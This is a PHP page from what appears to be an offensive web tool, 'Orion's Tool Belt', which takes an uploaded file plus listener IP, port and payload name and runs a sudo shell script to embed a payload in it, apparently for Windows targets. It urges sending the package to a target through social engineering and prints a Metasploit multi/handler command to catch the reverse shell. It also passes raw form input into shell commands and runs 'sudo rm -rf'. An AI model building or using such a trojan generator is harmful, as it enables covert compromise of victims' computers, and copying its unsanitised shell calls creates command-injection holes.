<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Orion's Tool Belt.</h4>
		<div class="clear"></div>
		
              
                                         
     <?php
               
                if(isset($_POST['submit']))
                {
                    $ip=$_POST['ip'];
                    $port=$_POST['port'];
                  
                    $pkg=$_POST['pkg'];
                     
                     $c=$_POST['c'];
                 
      if($ip==''||$port==''){
                   
                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered data correctly...'});</script>";
             
                   }else{
                       
                   
                require_once 'loading.php';
                 echo "<fieldset>";
                 echo "Upload: " . $_FILES["userfile"]["name"] . "<br>";
                  exec("sudo rm -rf exploits/*");
                  exec("sudo mkdir upload && sudo chmod 777 -R upload/ ");  
             
                  $uploaddir = 'upload/';
                  if($pkg==''){
                      $pkg=$_FILES["userfile"]["name"];
                  }
              $uploadfile = $uploaddir .$pkg;

if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
    echo "File $pkg is valid, and was successfully uploaded.\n"."<br/>";
      shell("sudo sh cmd/bexe.sh $c $pkg $ip $port");
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
echo '<p><b>PAYLOAD</b>                   -->'.$c.'</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to the target with any social engineering technique  ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 

}else {
    echo "Possible file upload attack!\n";
}
print "</pre>";
 $host=$_SERVER['SERVER_ADDR'];
	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";

         echo '</div>
                                    <footer>
				<div align="left">
					
					<h3>Finished</h3>
                                        
				</div>
			</footer>
		</article><!-- end of styles article -->
                 <h4 class="alert_success">Success </h4>
                 
 ';
         
 }       
                }                
    
                
 ?>             </fieldset>
		<div class="spacer"></div>
	</section>
</body>
</html>

